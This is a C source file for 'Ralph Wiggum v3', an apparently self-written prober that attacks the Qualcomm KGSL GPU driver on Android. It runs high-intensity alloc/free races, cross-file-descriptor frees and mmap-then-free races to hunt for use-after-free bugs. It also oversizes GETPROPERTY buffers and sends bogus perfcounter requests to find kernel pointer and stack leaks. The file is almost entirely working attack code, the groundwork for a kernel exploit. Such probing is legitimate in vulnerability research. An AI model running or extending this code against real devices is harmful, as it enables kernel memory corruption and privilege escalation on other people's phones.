/*
 * Ralph Wiggum v3 — High-Intensity KGSL Race & Leak Prober
 * "Me fail English? That's unpossible!" -- Ralph Wiggum
 *
 * Focused attack vectors after v2 showed basic UAF/double-free are guarded:
 *   1. High-intensity memory alloc/free races (10K+ iterations, tight timing)
 *   2. Multi-fd races (same object from different file descriptors)
 *   3. GETPROPERTY stack leak hunting (edge-case buffer sizes)
 *   4. Perfcounter register access exploitation
 *   5. Memory mmap + free race
 *
 * Compile: gcc -static -O2 -o ralph3 ralph3.c -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <setjmp.h>
#include <pthread.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* ioctl encoding */
#define _MY_IOC(dir,type,nr,size) ((unsigned long)(((dir)<<30)|((size)<<16)|((type)<<8)|(nr)))
#define _MY_IOW(type,nr,sz)  _MY_IOC(1,(type),(nr),(sz))
#define _MY_IOR(type,nr,sz)  _MY_IOC(2,(type),(nr),(sz))
#define _MY_IOWR(type,nr,sz) _MY_IOC(3,(type),(nr),(sz))

#define KGSL_IOC_TYPE 0x09
#define KGSL_DEVICE "/dev/kgsl-3d0"

/* Structs */
struct kgsl_gpumem_alloc_id {
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    unsigned long gpuaddr;
    unsigned long __pad[2];
};
#define IOCTL_GPUMEM_ALLOC_ID _MY_IOWR(KGSL_IOC_TYPE, 0x34, sizeof(struct kgsl_gpumem_alloc_id))

struct kgsl_gpumem_free_id {
    unsigned int id;
    unsigned int __pad;
};
#define IOCTL_GPUMEM_FREE_ID _MY_IOWR(KGSL_IOC_TYPE, 0x35, sizeof(struct kgsl_gpumem_free_id))

struct kgsl_gpumem_get_info {
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    unsigned long useraddr;
    unsigned long __pad[4];
};
#define IOCTL_GPUMEM_GET_INFO _MY_IOWR(KGSL_IOC_TYPE, 0x36, sizeof(struct kgsl_gpumem_get_info))

struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};
#define IOCTL_GPUMEM_ALLOC _MY_IOWR(KGSL_IOC_TYPE, 0x2f, sizeof(struct kgsl_gpumem_alloc))

struct kgsl_sharedmem_free {
    unsigned long gpuaddr;
};
#define IOCTL_SHAREDMEM_FREE _MY_IOW(KGSL_IOC_TYPE, 0x21, sizeof(struct kgsl_sharedmem_free))

struct kgsl_device_getproperty {
    unsigned int type;
    void *value;
    unsigned long sizebytes;
};
#define IOCTL_GETPROPERTY _MY_IOWR(KGSL_IOC_TYPE, 0x02, sizeof(struct kgsl_device_getproperty))

struct kgsl_perfcounter_get {
    unsigned int groupid;
    unsigned int countable;
    unsigned int offset;
    unsigned int offset_hi;
    unsigned int __pad;
};
#define IOCTL_PERFCOUNTER_GET _MY_IOWR(KGSL_IOC_TYPE, 0x38, sizeof(struct kgsl_perfcounter_get))

struct kgsl_perfcounter_put {
    unsigned int groupid;
    unsigned int countable;
};
#define IOCTL_PERFCOUNTER_PUT _MY_IOW(KGSL_IOC_TYPE, 0x39, sizeof(struct kgsl_perfcounter_put))

struct kgsl_perfcounter_read_group {
    unsigned int groupid;
    unsigned int countable;
    unsigned long long value;
};

struct kgsl_perfcounter_read {
    struct kgsl_perfcounter_read_group *reads;
    unsigned int count;
    unsigned int __pad;
};
#define IOCTL_PERFCOUNTER_READ _MY_IOWR(KGSL_IOC_TYPE, 0x3b, sizeof(struct kgsl_perfcounter_read))

struct kgsl_perfcounter_query {
    unsigned int groupid;
    unsigned int *countables;
    unsigned int count;
    unsigned int max_counters;
    unsigned int __pad[2];
};
#define IOCTL_PERFCOUNTER_QUERY _MY_IOWR(KGSL_IOC_TYPE, 0x3a, sizeof(struct kgsl_perfcounter_query))

/* Signal recovery */
static __thread sigjmp_buf jmp;
static __thread volatile sig_atomic_t caught_sig = 0;

static void sighandler(int sig) {
    caught_sig = sig;
    siglongjmp(jmp, sig);
}

/* Logging */
static FILE *logfp;
static pthread_mutex_t log_lock = PTHREAD_MUTEX_INITIALIZER;

static void lg(const char *fmt, ...) {
    va_list ap;
    pthread_mutex_lock(&log_lock);
    va_start(ap, fmt);
    vfprintf(logfp, fmt, ap);
    va_end(ap);
    fflush(logfp);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
    pthread_mutex_unlock(&log_lock);
}

/* Pointer leak check */
static int check_leak(const void *buf, size_t len, const char *label) {
    const uint64_t *p = (const uint64_t *)buf;
    int found = 0;
    size_t i;
    for (i = 0; i < len / 8; i++) {
        uint64_t v = p[i];
        if (v == 0 || v == (uint64_t)-1) continue;
        if ((v >> 32) >= 0xffffffc0ULL) {
            lg("!! KERNEL LEAK in %s: offset %zu = 0x%016llx !!\n",
               label, i * 8, (unsigned long long)v);
            found++;
        }
    }
    return found;
}

/* ===== TEST 1: HIGH-INTENSITY ALLOC/FREE RACE ===== */

struct race1_data {
    int fd;
    volatile int running;
    volatile int crashes;
    volatile int wins;  /* successful UAF accesses */
    volatile unsigned int *shared_ids;  /* IDs allocated by main thread */
    volatile int n_ids;
};

static void *race1_free_thread(void *arg) {
    struct race1_data *rd = arg;
    struct kgsl_gpumem_free_id f;

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    while (rd->running) {
        if (rd->n_ids <= 0) { usleep(1); continue; }
        int idx = rd->n_ids - 1;
        if (idx < 0) continue;
        f.id = rd->shared_ids[idx];
        f.__pad = 0;

        if (sigsetjmp(jmp, 1) == 0) {
            ioctl(rd->fd, IOCTL_GPUMEM_FREE_ID, &f);
        } else {
            __sync_fetch_and_add(&rd->crashes, 1);
        }
    }
    return NULL;
}

static void *race1_info_thread(void *arg) {
    struct race1_data *rd = arg;
    struct kgsl_gpumem_get_info gi;

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    while (rd->running) {
        if (rd->n_ids <= 0) { usleep(1); continue; }
        int idx = rd->n_ids - 1;
        if (idx < 0) continue;

        memset(&gi, 0, sizeof(gi));
        gi.id = rd->shared_ids[idx];

        if (sigsetjmp(jmp, 1) == 0) {
            int ret = ioctl(rd->fd, IOCTL_GPUMEM_GET_INFO, &gi);
            if (ret == 0) {
                /* Check if we got info on a freed object */
                int leaks = check_leak(&gi, sizeof(gi), "RACE1_GET_INFO");
                if (leaks > 0)
                    __sync_fetch_and_add(&rd->wins, 1);
            }
        } else {
            __sync_fetch_and_add(&rd->crashes, 1);
        }
    }
    return NULL;
}

static void test_race_intense(int fd) {
    lg("\n=== TEST 1: HIGH-INTENSITY ALLOC/FREE RACE (10K iterations) ===\n");

    struct race1_data rd;
    unsigned int ids[16];
    pthread_t t_free, t_info;
    int i, ret;

    rd.fd = fd;
    rd.running = 1;
    rd.crashes = 0;
    rd.wins = 0;
    rd.shared_ids = ids;
    rd.n_ids = 0;

    pthread_create(&t_free, NULL, race1_free_thread, &rd);
    pthread_create(&t_info, NULL, race1_info_thread, &rd);

    for (i = 0; i < 10000; i++) {
        /* Allocate */
        struct kgsl_gpumem_alloc_id a;
        memset(&a, 0, sizeof(a));
        a.size = 4096;
        if (sigsetjmp(jmp, 1) == 0) {
            ret = ioctl(fd, IOCTL_GPUMEM_ALLOC_ID, &a);
        } else {
            rd.crashes++;
            continue;
        }
        if (ret != 0) continue;

        /* Store ID for race threads */
        int idx = i % 16;
        ids[idx] = a.id;
        if (rd.n_ids < 16) rd.n_ids++;

        /* Main thread also tries to free (race with free thread) */
        struct kgsl_gpumem_free_id f;
        f.id = a.id;
        f.__pad = 0;
        if (sigsetjmp(jmp, 1) == 0) {
            ioctl(fd, IOCTL_GPUMEM_FREE_ID, &f);
        } else {
            rd.crashes++;
        }

        if ((i + 1) % 2000 == 0) {
            lg("[race1 %d/10000] crashes=%d wins=%d\n", i + 1, rd.crashes, rd.wins);
        }
    }

    rd.running = 0;
    pthread_join(t_free, NULL);
    pthread_join(t_info, NULL);

    lg("Race1 complete: crashes=%d wins=%d\n", rd.crashes, rd.wins);
    if (rd.crashes > 0)
        lg("!!! RACE1 PRODUCED %d CRASHES — EXPLOITABLE !!!\n", rd.crashes);
    if (rd.wins > 0)
        lg("!!! RACE1 PRODUCED %d UAF READS — INFO LEAK !!!\n", rd.wins);
}

/* ===== TEST 2: MULTI-FD RACE ===== */
static void test_multi_fd_race(void) {
    lg("\n=== TEST 2: MULTI-FD ALLOC/FREE RACE (5K iterations) ===\n");

    int fd1 = open(KGSL_DEVICE, O_RDWR);
    int fd2 = open(KGSL_DEVICE, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        lg("Failed to open two fds\n");
        if (fd1 >= 0) close(fd1);
        if (fd2 >= 0) close(fd2);
        return;
    }

    int i, ret, crashes = 0, unusual = 0;

    for (i = 0; i < 5000; i++) {
        /* Alloc on fd1 */
        struct kgsl_gpumem_alloc_id a;
        memset(&a, 0, sizeof(a));
        a.size = 4096;
        if (sigsetjmp(jmp, 1) == 0) {
            ret = ioctl(fd1, IOCTL_GPUMEM_ALLOC_ID, &a);
        } else {
            crashes++;
            fd1 = open(KGSL_DEVICE, O_RDWR);
            if (fd1 < 0) break;
            continue;
        }
        if (ret != 0) continue;

        /* Try to free on fd2 (cross-fd free) */
        struct kgsl_gpumem_free_id f;
        f.id = a.id;
        f.__pad = 0;
        if (sigsetjmp(jmp, 1) == 0) {
            ret = ioctl(fd2, IOCTL_GPUMEM_FREE_ID, &f);
            if (ret == 0) {
                unusual++;
                lg("!! CROSS-FD FREE ACCEPTED id=%u at iter %d !!\n", a.id, i);
            }
        } else {
            crashes++;
            lg("!! CROSS-FD FREE CRASHED at iter %d !!\n", i);
            fd2 = open(KGSL_DEVICE, O_RDWR);
            if (fd2 < 0) break;
        }

        /* Try to get info on fd2 */
        struct kgsl_gpumem_get_info gi;
        memset(&gi, 0, sizeof(gi));
        gi.id = a.id;
        if (sigsetjmp(jmp, 1) == 0) {
            ret = ioctl(fd2, IOCTL_GPUMEM_GET_INFO, &gi);
            if (ret == 0) {
                unusual++;
                lg("!! CROSS-FD GET_INFO ACCEPTED id=%u at iter %d !!\n", a.id, i);
                check_leak(&gi, sizeof(gi), "CROSS_FD_INFO");
            }
        } else {
            crashes++;
        }

        /* Clean up on fd1 */
        f.id = a.id;
        f.__pad = 0;
        ioctl(fd1, IOCTL_GPUMEM_FREE_ID, &f);

        if ((i + 1) % 1000 == 0) {
            lg("[multi-fd %d/5000] crashes=%d unusual=%d\n", i + 1, crashes, unusual);
        }
    }

    close(fd1);
    close(fd2);
    lg("Multi-fd complete: crashes=%d unusual=%d\n", crashes, unusual);
}

/* ===== TEST 3: GETPROPERTY STACK LEAK ===== */
static void test_getproperty_leak(int fd) {
    lg("\n=== TEST 3: GETPROPERTY STACK LEAK HUNTING ===\n");

    /* Property types and their expected sizes */
    struct {
        unsigned int type;
        const char *name;
        size_t expected_size;
    } props[] = {
        {0x01, "DEVICE_INFO", 40},
        {0x08, "VERSION", 16},
        {0x02, "DEVICE_SHADOW", 0},  /* unknown size */
        {0x03, "DEVICE_POWER", 0},
        {0x06, "MMU_ENABLE", 4},
        {0x07, "INTERRUPT_WAITS", 4},
        {0x09, "GPU_RESET_STAT", 4},
        {0x0E, "PWRCTRL", 0},
        {0x12, "PWR_CONSTRAINT", 0},
    };
    int nprops = sizeof(props) / sizeof(props[0]);
    int i, j, ret;

    for (i = 0; i < nprops; i++) {
        /* Try exact size first */
        if (props[i].expected_size > 0) {
            unsigned char buf[256];
            memset(buf, 0xCC, sizeof(buf)); /* Fill with sentinel */
            struct kgsl_device_getproperty gp;
            gp.type = props[i].type;
            gp.value = buf;
            gp.sizebytes = props[i].expected_size;
            if (sigsetjmp(jmp, 1) == 0) {
                ret = ioctl(fd, IOCTL_GETPROPERTY, &gp);
                if (ret == 0) {
                    lg("%s (sz=%zu): SUCCESS\n", props[i].name, props[i].expected_size);
                    check_leak(buf, props[i].expected_size, props[i].name);

                    /* Print hex dump */
                    printf("  Data: ");
                    for (j = 0; j < (int)props[i].expected_size; j++) {
                        if (j > 0 && j % 16 == 0) printf("\n        ");
                        printf("%02x ", buf[j]);
                    }
                    printf("\n");

                    /* Now try LARGER sizes to see if kernel copies extra bytes */
                    size_t test_sizes[] = {
                        props[i].expected_size + 8,
                        props[i].expected_size + 16,
                        props[i].expected_size + 32,
                        props[i].expected_size * 2,
                        256
                    };
                    int nts = sizeof(test_sizes) / sizeof(test_sizes[0]);
                    int k;
                    for (k = 0; k < nts; k++) {
                        memset(buf, 0xCC, sizeof(buf));
                        gp.type = props[i].type;
                        gp.value = buf;
                        gp.sizebytes = test_sizes[k];
                        errno = 0;
                        ret = ioctl(fd, IOCTL_GETPROPERTY, &gp);
                        if (ret == 0) {
                            /* Check if bytes beyond expected_size were modified */
                            int extra_modified = 0;
                            for (j = props[i].expected_size; j < (int)test_sizes[k] && j < 256; j++) {
                                if (buf[j] != 0xCC) {
                                    extra_modified++;
                                }
                            }
                            if (extra_modified > 0) {
                                lg("!! STACK LEAK in %s: sz=%zu wrote %d bytes beyond expected %zu !!\n",
                                   props[i].name, test_sizes[k], extra_modified, props[i].expected_size);
                                printf("  Extra bytes: ");
                                for (j = props[i].expected_size; j < (int)test_sizes[k] && j < 256; j++)
                                    printf("%02x ", buf[j]);
                                printf("\n");
                                check_leak(buf + props[i].expected_size,
                                           test_sizes[k] - props[i].expected_size,
                                           "STACK_OVERFLOW");
                            }
                        }
                    }
                }
            }
        }

        /* Try many sizes for unknown-size properties */
        if (props[i].expected_size == 0) {
            size_t try_sizes[] = {1, 2, 4, 8, 12, 16, 20, 24, 28, 32, 40, 48, 64, 128, 256};
            int nts = sizeof(try_sizes) / sizeof(try_sizes[0]);
            int k;
            for (k = 0; k < nts; k++) {
                unsigned char buf[256];
                memset(buf, 0xCC, sizeof(buf));
                struct kgsl_device_getproperty gp;
                gp.type = props[i].type;
                gp.value = buf;
                gp.sizebytes = try_sizes[k];
                if (sigsetjmp(jmp, 1) == 0) {
                    errno = 0;
                    ret = ioctl(fd, IOCTL_GETPROPERTY, &gp);
                    if (ret == 0) {
                        lg("%s (sz=%zu): SUCCESS!\n", props[i].name, try_sizes[k]);
                        printf("  Data: ");
                        for (j = 0; j < (int)try_sizes[k]; j++)
                            printf("%02x ", buf[j]);
                        printf("\n");
                        check_leak(buf, try_sizes[k], props[i].name);
                        break; /* Found working size */
                    }
                } else {
                    lg("!! %s CRASHED at sz=%zu !!\n", props[i].name, try_sizes[k]);
                    break;
                }
            }
        }
    }
}

/* ===== TEST 4: PERFCOUNTER EXPLOITATION ===== */
static void test_perfcounter(int fd) {
    lg("\n=== TEST 4: PERFCOUNTER EXPLOITATION ===\n");

    int ret, i;

    /* First, GET a perf counter to get an offset */
    struct kgsl_perfcounter_get pg;
    memset(&pg, 0, sizeof(pg));
    pg.groupid = 0;
    pg.countable = 0;

    if (sigsetjmp(jmp, 1) == 0) {
        ret = ioctl(fd, IOCTL_PERFCOUNTER_GET, &pg);
        if (ret == 0) {
            lg("PERFCOUNTER_GET: group=0 countable=0 offset=0x%x offset_hi=0x%x\n",
               pg.offset, pg.offset_hi);
        } else {
            lg("PERFCOUNTER_GET failed: err=%d\n", errno);
        }
    }

    /* Try to READ perf counters */
    struct kgsl_perfcounter_read_group rg[4];
    memset(rg, 0, sizeof(rg));
    rg[0].groupid = 0;
    rg[0].countable = 0;
    struct kgsl_perfcounter_read pr;
    pr.reads = rg;
    pr.count = 1;
    pr.__pad = 0;

    if (sigsetjmp(jmp, 1) == 0) {
        ret = ioctl(fd, IOCTL_PERFCOUNTER_READ, &pr);
        if (ret == 0) {
            lg("PERFCOUNTER_READ: value=0x%016llx\n", (unsigned long long)rg[0].value);
        } else {
            lg("PERFCOUNTER_READ failed: err=%d (%s)\n", errno, strerror(errno));
        }
    } else {
        lg("!! PERFCOUNTER_READ CRASHED !!\n");
    }

    /* Try to GET counters with various groups and countables */
    lg("\n--- Enumerating perf counter offsets ---\n");
    for (i = 0; i < 28; i++) {
        unsigned int countbuf[64];
        memset(countbuf, 0, sizeof(countbuf));
        struct kgsl_perfcounter_query pq;
        memset(&pq, 0, sizeof(pq));
        pq.groupid = i;
        pq.countables = countbuf;
        pq.count = 64;

        if (sigsetjmp(jmp, 1) == 0) {
            ret = ioctl(fd, IOCTL_PERFCOUNTER_QUERY, &pq);
            if (ret == 0 && pq.max_counters > 0) {
                /* Try to GET each countable */
                unsigned int c;
                for (c = 0; c < pq.max_counters && c < 4; c++) {
                    memset(&pg, 0, sizeof(pg));
                    pg.groupid = i;
                    pg.countable = c;
                    if (sigsetjmp(jmp, 1) == 0) {
                        ret = ioctl(fd, IOCTL_PERFCOUNTER_GET, &pg);
                        if (ret == 0) {
                            lg("  group=%d countable=%d offset=0x%x offset_hi=0x%x\n",
                               i, c, pg.offset, pg.offset_hi);

                            /* Read the value */
                            memset(rg, 0, sizeof(rg));
                            rg[0].groupid = i;
                            rg[0].countable = c;
                            pr.reads = rg;
                            pr.count = 1;
                            if (sigsetjmp(jmp, 1) == 0) {
                                ret = ioctl(fd, IOCTL_PERFCOUNTER_READ, &pr);
                                if (ret == 0) {
                                    lg("    value=0x%016llx\n", (unsigned long long)rg[0].value);
                                    /* Check if value looks like a kernel address */
                                    if ((rg[0].value >> 32) >= 0xffffffc0ULL) {
                                        lg("    !! POSSIBLE KERNEL ADDR IN PERF COUNTER !!\n");
                                    }
                                }
                            }

                            /* PUT it back */
                            struct kgsl_perfcounter_put pp;
                            pp.groupid = i;
                            pp.countable = c;
                            ioctl(fd, IOCTL_PERFCOUNTER_PUT, &pp);
                        }
                    }
                }
            }
        }
    }

    /* Try with bogus group/countable values */
    lg("\n--- Bogus perf counter requests ---\n");
    unsigned int bad_groups[] = {0xFFFFFFFF, 0x80000000, 100, 255, 256, 1000};
    int nbad = sizeof(bad_groups) / sizeof(bad_groups[0]);
    for (i = 0; i < nbad; i++) {
        memset(&pg, 0, sizeof(pg));
        pg.groupid = bad_groups[i];
        pg.countable = 0;
        if (sigsetjmp(jmp, 1) == 0) {
            errno = 0;
            ret = ioctl(fd, IOCTL_PERFCOUNTER_GET, &pg);
            if (ret == 0) {
                lg("!! BOGUS GROUP 0x%x ACCEPTED: offset=0x%x !!\n",
                   bad_groups[i], pg.offset);
            }
        } else {
            lg("!! BOGUS GROUP 0x%x CRASHED !!\n", bad_groups[i]);
        }
    }
}

/* ===== TEST 5: MMAP + FREE RACE ===== */
static void test_mmap_race(int fd) {
    lg("\n=== TEST 5: MMAP + FREE RACE (1K iterations) ===\n");

    int i, ret, crashes = 0, unusual = 0;

    for (i = 0; i < 1000; i++) {
        /* Allocate GPU memory */
        struct kgsl_gpumem_alloc_id a;
        memset(&a, 0, sizeof(a));
        a.size = 4096;
        if (sigsetjmp(jmp, 1) == 0) {
            ret = ioctl(fd, IOCTL_GPUMEM_ALLOC_ID, &a);
        } else {
            crashes++;
            continue;
        }
        if (ret != 0) continue;

        /* mmap the GPU memory */
        void *mapped = mmap(NULL, a.mmapsize, PROT_READ | PROT_WRITE,
                            MAP_SHARED, fd, a.id * 4096);
        if (mapped == MAP_FAILED) {
            /* Try offset = gpuaddr */
            mapped = mmap(NULL, a.mmapsize, PROT_READ | PROT_WRITE,
                          MAP_SHARED, fd, a.gpuaddr);
        }

        if (mapped != MAP_FAILED) {
            unusual++;
            lg("!! MMAP SUCCEEDED: id=%u addr=%p size=%zu (iter %d) !!\n",
               a.id, mapped, a.mmapsize, i);

            /* Now free while mapped — this is the race */
            struct kgsl_gpumem_free_id f;
            f.id = a.id;
            f.__pad = 0;
            if (sigsetjmp(jmp, 1) == 0) {
                ret = ioctl(fd, IOCTL_GPUMEM_FREE_ID, &f);
                if (ret == 0) {
                    lg("!! FREED WHILE MAPPED id=%u !!\n", a.id);

                    /* Try to read from the freed+mapped memory */
                    if (sigsetjmp(jmp, 1) == 0) {
                        volatile unsigned char *p = (volatile unsigned char *)mapped;
                        unsigned char val = p[0]; /* Read from freed mapping */
                        lg("!! READ FROM FREED MAPPING: val=0x%02x !!\n", val);

                        /* Check for kernel data */
                        check_leak(mapped, 256, "FREED_MMAP");
                    } else {
                        lg("!! CRASH reading freed mmap (sig=%d) !!\n", caught_sig);
                        crashes++;
                    }
                }
            } else {
                lg("!! CRASH freeing mapped memory (sig=%d) !!\n", caught_sig);
                crashes++;
            }

            munmap(mapped, a.mmapsize);
        } else {
            /* Just free normally */
            struct kgsl_gpumem_free_id f;
            f.id = a.id;
            f.__pad = 0;
            ioctl(fd, IOCTL_GPUMEM_FREE_ID, &f);
        }

        if ((i + 1) % 200 == 0) {
            lg("[mmap %d/1000] crashes=%d unusual=%d\n", i + 1, crashes, unusual);
        }
    }

    lg("Mmap race complete: crashes=%d unusual=%d\n", crashes, unusual);
}

/* ===== MAIN ===== */
int main(void) {
    logfp = fopen("/data/data/com.termux/files/home/ralph3.log", "w");
    if (!logfp) logfp = fopen("ralph3.log", "w");
    if (!logfp) logfp = stdout;

    printf("=============================================\n");
    printf("  Ralph Wiggum v3 — Race & Leak Prober\n");
    printf("  \"Me fail English? That's unpossible!\"\n");
    printf("=============================================\n");
    printf("PID: %d\n\n", getpid());

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);

    int fd = open(KGSL_DEVICE, O_RDWR);
    if (fd < 0) {
        printf("FATAL: open(%s): %s\n", KGSL_DEVICE, strerror(errno));
        return 1;
    }
    printf("Opened %s fd=%d\n\n", KGSL_DEVICE, fd);

    test_race_intense(fd);
    test_multi_fd_race();
    test_getproperty_leak(fd);
    test_perfcounter(fd);
    test_mmap_race(fd);

    printf("\n=============================================\n");
    printf("  Ralph says: \"Even my boogers are smart!\"\n");
    printf("=============================================\n");

    close(fd);
    if (logfp != stdout) fclose(logfp);
    return 0;
}
